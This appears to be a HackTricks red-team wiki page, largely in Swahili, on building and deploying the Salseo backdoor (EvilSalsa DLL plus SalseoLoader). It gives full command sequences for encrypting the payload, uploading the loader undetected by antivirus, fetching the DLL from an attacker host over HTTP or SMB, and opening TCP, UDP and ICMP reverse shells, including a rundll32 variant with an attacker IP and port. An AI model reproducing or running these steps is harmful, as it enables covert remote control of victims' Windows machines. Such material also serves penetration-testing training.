# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiling the binaries

Pakua msimbo wa chanzo kutoka github na uunde **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** iliyosakinishwa ili kuunda msimbo huo.

Uunde miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo unakusudia kuitumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).

Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **"Build" Tab** ya **kushoto "Platform Target".**

(\*\*Ikiwa huwezi kupata chaguo hili bonyeza kwenye **"Project Tab"** kisha kwenye **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Kisha, jenga miradi yote miwili (Build -> Build Solution) (Ndani ya log zitajitokeza njia ya executable):

![](<../.gitbook/assets/image (381).png>)

## Prepare the Backdoor

Kwanza kabisa, utahitaji kuandika **EvilSalsa.dll.** Ili kufanya hivyo, unaweza kutumia script ya python **encrypterassembly.py** au unaweza kuunda mradi **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, sasa una kila kitu unachohitaji kutekeleza mambo yote ya Salseo: **encoded EvilDalsa.dll** na **binary ya SalseoLoader.**

**Pakia binary ya SalseoLoader.exe kwenye mashine. Hazipaswi kugundulika na AV yoyote...**

## **Tekeleza backdoor**

### **Kupata TCP reverse shell (kupakua dll iliyosimbwa kupitia HTTP)**

Kumbuka kuanzisha nc kama msikilizaji wa reverse shell na seva ya HTTP kutoa evilsalsa iliyosimbwa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kupata shell ya UDP reverse (kushusha dll iliyokodiwa kupitia SMB)**

Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse, na seva ya SMB kutoa evilsalsa iliyokodiwa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kupata ICMP reverse shell (dll iliyosimbwa tayari ndani ya mwathiriwa)**

**Wakati huu unahitaji chombo maalum kwenye mteja kupokea reverse shell. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Zima Majibu ya ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Tekeleza mteja:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Ndani ya mwathiriwa, hebu tuendeshe kitu cha salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kuunda SalseoLoader kama DLL inayosafirisha kazi kuu

Fungua mradi wa SalseoLoader ukitumia Visual Studio.

### Ongeza kabla ya kazi kuu: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Sakinisha DllExport kwa mradi huu

#### **Zana** --> **Meneja wa Kifurushi cha NuGet** --> **Simamisha Kifurushi cha NuGet kwa Suluhisho...**

![](<../.gitbook/assets/image (881).png>)

#### **Tafuta kifurushi cha DllExport (ukitumia kichupo cha Browse), na bonyeza Sakinisha (na kubali popup)**

![](<../.gitbook/assets/image (100).png>)

Katika folda yako ya mradi, faili zifuatazo zimeonekana: **DllExport.bat** na **DllExport\_Configure.bat**

### **U**ondoe DllExport

Bonyeza **Ondoa** (ndiyo, ni ajabu lakini ni muhimu)

![](<../.gitbook/assets/image (97).png>)

### **Toka Visual Studio na tekeleza DllExport\_configure**

Tu **toka** Visual Studio

Kisha, nenda kwenye **folda ya SalseoLoader** yako na **tekeleza DllExport\_Configure.bat**

Chagua **x64** (ikiwa unakusudia kuitumia ndani ya sanduku la x64, hiyo ilikuwa hali yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace kwa DllExport**) na bonyeza **Tumia**

![](<../.gitbook/assets/image (882).png>)

### **Fungua mradi tena na Visual Studio**

**\[DllExport]** haipaswi kuwa na alama ya kosa tena

![](<../.gitbook/assets/image (670).png>)

### Jenga suluhisho

Chagua **Aina ya Matokeo = Maktaba ya Darasa** (Mradi --> SalseoLoader Mali --> Programu --> Aina ya matokeo = Maktaba ya Darasa)

![](<../.gitbook/assets/image (847).png>)

Chagua **jukwaa la x64** (Mradi --> SalseoLoader Mali --> Jenga --> Lengo la jukwaa = x64)

![](<../.gitbook/assets/image (285).png>)

Ili **kujenga** suluhisho: Jenga --> Jenga Suluhisho (Ndani ya console ya Matokeo, njia ya DLL mpya itaonekana)

### Jaribu Dll iliyozalishwa

Nakili na ubandike Dll mahali unapotaka kuijaribu.

Tekeleza:
```
rundll32.exe SalseoLoader.dll,main
```
Ikiwa hakuna kosa linalojitokeza, huenda una DLL inayofanya kazi!!

## Pata shell ukitumia DLL

Usisahau kutumia **HTTP** **server** na kuweka **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
